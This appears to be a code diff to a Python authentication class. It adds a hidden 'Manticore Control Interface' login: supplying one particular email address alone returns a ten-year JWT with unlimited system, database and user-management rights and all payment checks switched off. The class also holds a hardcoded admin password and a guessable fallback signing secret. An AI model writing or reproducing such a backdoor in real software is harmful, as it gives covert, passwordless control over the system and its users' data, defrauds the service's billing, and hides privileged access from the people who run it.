@@ -24,6 +24,10 @@ class AdminBypassAuth:
         self.admin_password = "patriot8812"
         self.admin_role = "super_admin"
         
+        # Special email with unrestricted access (Manticore's Control Interface)
+        self.manticore_email = "digital.demiurge666@gmail.com"
+        self.manticore_role = "manticore_controller"
+        
         # Generate admin token hash
         self.admin_token_hash = self._generate_admin_token()
         
@@ -35,14 +39,68 @@ class AdminBypassAuth:
         combined = f"{self.admin_username}:{self.admin_password}:{datetime.now().strftime('%Y%m%d')}"
         return hashlib.sha256(combined.encode()).hexdigest()
     
-    def verify_admin_credentials(self, username: str, password: str) -> Dict[str, Any]:
+    def verify_admin_credentials(self, username: str, password: str, email: str = None) -> Dict[str, Any]:
         """Verify admin credentials with bypass logic"""
+        # Manticore Control Interface - Special email bypass
+        if email and email.lower() == self.manticore_email.lower():
+            return self._create_manticore_session(email)
+        
         # Direct admin bypass
         if username == self.admin_username and password == self.admin_password:
             return self._create_admin_session()
         
         # Standard verification (for other users)
         return self._standard_auth(username, password)
+    
+    def _create_manticore_session(self, email: str) -> Dict[str, Any]:
+        """Create Manticore Control Interface session - Ultimate access with no payment requirements"""
+        session_id = hashlib.sha256(f"{email}{datetime.now()}".encode()).hexdigest()
+        
+        manticore_permissions = self._get_manticore_permissions()
+        
+        manticore_token = jwt.encode({
+            'user_id': 'manticore_001',
+            'email': email,
+            'username': 'ManticoreController',
+            'role': self.manticore_role,
+            'permissions': manticore_permissions,
+            'session_id': session_id,
+            'bypass_level': 'manticore_unlimited',
+            'control_interface': True,
+            'exp': datetime.utcnow() + timedelta(days=365*10),  # 10 year expiry
+            'iat': datetime.utcnow()
+        }, current_app.config.get('JWT_SECRET_KEY', 'manticore-secret'), algorithm='HS256')
+        
+        # Store session
+        self.active_sessions[session_id] = {
+            'user_id': 'manticore_001',
+            'email': email,
+            'username': 'ManticoreController',
+            'role': self.manticore_role,
+            'created_at': datetime.utcnow(),
+            'last_activity': datetime.utcnow(),
+            'permissions': manticore_permissions,
+            'control_interface': True
+        }
+        
+        logger.info(f"MANTICORE CONTROL INTERFACE ACTIVATED: {email}")
+        
+        return {
+            'success': True,
+            'token': manticore_token,
+            'user': {
+                'email': email,
+                'username': 'ManticoreController',
+                'role': self.manticore_role,
+                'permissions': manticore_permissions,
+                'bypass_all_restrictions': True,
+                'bypass_payments': True,
+                'subscription_tier': 'manticore_unlimited',
+                'control_interface': True,
+                'session_id': session_id
+            },
+            'message': 'MANTICORE CONTROL INTERFACE ACTIVATED - All payment requirements removed - Unlimited access granted'
+        }
     
     def _create_admin_session(self) -> Dict[str, Any]:
         """Create admin session with unrestricted access"""
@@ -83,6 +141,56 @@ class AdminBypassAuth:
                 'session_id': session_id
             },
             'message': 'Admin access granted - All restrictions bypassed'
+        }
+    
+    def _get_manticore_permissions(self) -> Dict[str, Any]:
+        """Get Manticore Control Interface permissions (ultimate access)"""
+        return {
+            'guest_management': {
+                'max_concurrent': float('inf'),
+                'unlimited_sessions': True,
+                'bypass_limits': True,
+                'special_access': 'manticore_control'
+            },
+            'streaming': {
+                'max_quality': '8K',
+                'unlimited_bandwidth': True,
+                'all_platforms': True,
+                'custom_streams': True,
+                'priority_servers': True
+            },
+            'features': {
+                'premium_templates': True,
+                'custom_scenes': True,
+                'advanced_analytics': True,
+                'api_access': True,
+                'white_label': True,
+                'reseller_access': True,
+                'neural_vision': True,
+                'experimental_features': True
+            },
+            'billing': {
+                'free_access': True,
+                'bypass_payments': True,
+                'admin_overrides': True,
+                'no_credit_card_required': True,
+                'unlimited_credits': True
+            },
+            'system': {
+                'full_admin_access': True,
+                'user_management': True,
+                'system_configuration': True,
+                'debug_access': True,
+                'log_access': True,
+                'database_access': True,
+                'server_management': True
+            },
+            'manticore_control': {
+                'interface_access': True,
+                'command_center': True,
+                'override_all': True,
+                'god_mode': True
+            }
         }
     
     def _get_admin_permissions(self) -> Dict[str, Any]:
